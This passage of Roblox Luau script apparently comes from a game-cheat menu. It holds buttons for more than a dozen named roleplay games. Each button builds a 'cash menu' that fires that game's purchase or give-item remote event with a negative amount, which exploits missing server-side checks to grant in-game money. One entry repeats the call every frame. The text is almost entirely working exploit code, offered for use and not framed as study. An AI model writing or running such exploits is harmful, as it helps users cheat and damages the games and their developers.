Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic (uses AntiExploit)
sendButton.MouseButton1Click:Connect(function()
    local item = itemBox.Text
    local amount = tonumber(amountBox.Text)

    if item ~= "" and amount then
        ReplicatedStorage.AntiExploit:FireServer(item, amount)
    else
        warn("Invalid item or amount!")
    end
end)
end)

addMainMenuButton("TONDO ROLEPLAY (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyEvent:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("THE BILLIONARE CITY (MONSY)", function()
    -- LocalScript: MONEY GUI – Pure White + Black Text Only
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(1, 1, 1)  -- Pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(0, 0, 0)  -- Black text
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Money Amount
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 0, 0)  -- Black na rin (walang green)
moneyLabel.Font = Enum.Font.Roboto
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- CASH Button (White bg, black text)
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80,0,30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(1,1,1)  -- White
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(0,0,0)  -- Black text
cashButton.Font = Enum.Font.Roboto
cashButton.TextSize = 14
cashButton.Parent = frame

Instance.new("UICorner", cashButton).CornerRadius = UDim.new(0, 8)

-- Toggle Switch (White/Gray lang)
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0,40,0,20)
toggleFrame.Position = UDim2.new(0,10,1,-30)
toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
toggleFrame.Parent = frame
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0,10)

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0,16,0,16)
toggleButton.Position = UDim2.new(0,2,0.5,-8)
toggleButton.BackgroundColor3 = Color3.new(1,1,1)
toggleButton.Parent = toggleFrame
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,8)

-- Draggable (same pa rin)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)
RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Toggle Logic
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(200,200,200)  -- Light gray when ON
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
		end

		if isOn then
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
		else
			if connection then connection:Disconnect() end
		end
	end
end)

-- CASH Button
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update Money
task.spawn(function()
	local stats = player:WaitForChild("leaderstats")
	local cash = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

addMainMenuButton("PROMINENCE CITY S1 (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyToolEvent:FireServer("Calisto Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("PRESTIGE ROLEPLAY (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunStoreFolder.BuyTool:FireServer("Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("LOS SANTOS ROLEPLAY (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").UwUCafeFolder.BuyTool:FireServer("Normal Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("CAVITE ROLEPLAY (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("LUCIO CITY ROLEPLAY (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("SOUTH CENTRAL ROLEPLAY (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("MAHARLIKA ROLEPLAY (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("URBAN DECAY BETA (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").Storage.RandomStuff.ShopSystem:FireServer("", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("URBAN CITY V3 (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").UwUCafeFolder.BuyTool:FireServer("Prime", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["PLAYER MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
